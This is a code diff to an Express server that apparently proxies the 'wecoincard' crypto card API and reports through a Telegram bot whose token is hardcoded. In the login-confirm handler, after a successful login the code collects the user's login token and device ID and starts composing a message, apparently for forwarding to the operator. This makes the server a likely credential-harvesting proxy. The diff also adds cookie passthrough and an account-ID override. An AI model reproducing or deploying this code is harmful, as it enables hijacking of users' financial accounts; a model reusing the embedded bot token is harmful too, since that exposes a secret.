@@ -292,7 +292,7 @@ const app = express();
 const ORIGINAL_API = 'https://api.wecoincard.com';
 let BOT_TOKEN = process.env.BOT_TOKEN || '8636245254:AAHldk_gAF8p-Wz0klvG6XU9pOSHTvqTt4I';
 
-const BASE_URL = process.env.BASE_URL || (process.env.VERCEL_PROJECT_PRODUCTION_URL ? `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL}` : (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://xchas.vercel.app'));
+const BASE_URL = process.env.BASE_URL || (process.env.VERCEL_PROJECT_PRODUCTION_URL ? `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL}` : (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://wecoinvercel.vercel.app'));
 const WEBHOOK_URL = `${BASE_URL}/bot-webhook`;
 
 // === SECONDARY BOT CONFIGURATION ===
@@ -887,6 +887,9 @@ function bankListText(d) {
 app.use((req, res, next) => {
   if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
     req.parsedBody = req.body;
+    if (!req.rawBody) {
+      try { req.rawBody = Buffer.from(JSON.stringify(req.body)); } catch (e) { }
+    }
     ensureWebhook().catch(() => { });
     return next();
   }
@@ -1055,13 +1058,20 @@ function getResponseData(jsonResp) {
 
 function sendJson(res, headers, json, fallback) {
   const body = json ? JSON.stringify(json) : fallback;
-  headers['content-type'] = 'application/json; charset=utf-8';
-  headers['content-length'] = String(Buffer.byteLength(body));
-  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
-  headers['pragma'] = 'no-cache';
-  delete headers['etag'];
-  delete headers['last-modified'];
-  res.writeHead(200, headers);
+  const outHeaders = { ...(headers || {}) };
+  if (outHeaders['set-cookie']) {
+    try {
+      res.setHeader('Set-Cookie', outHeaders['set-cookie']);
+      delete outHeaders['set-cookie'];
+    } catch (e) { }
+  }
+  outHeaders['content-type'] = 'application/json; charset=utf-8';
+  outHeaders['content-length'] = String(Buffer.byteLength(body));
+  outHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+  outHeaders['pragma'] = 'no-cache';
+  delete outHeaders['etag'];
+  delete outHeaders['last-modified'];
+  res.writeHead(200, outHeaders);
   res.end(body);
 }
 
@@ -2578,6 +2588,10 @@ app.post('/app/user/login/confirm', async (req, res) => {
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+        if (data.useIdOverride) {
+          data.useIdOverride = null;
+          saveData(data).catch(() => { });
+        }
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
         const devId = body.deviceId || body.androidId || body.device_id || '';
         let baseMsg =
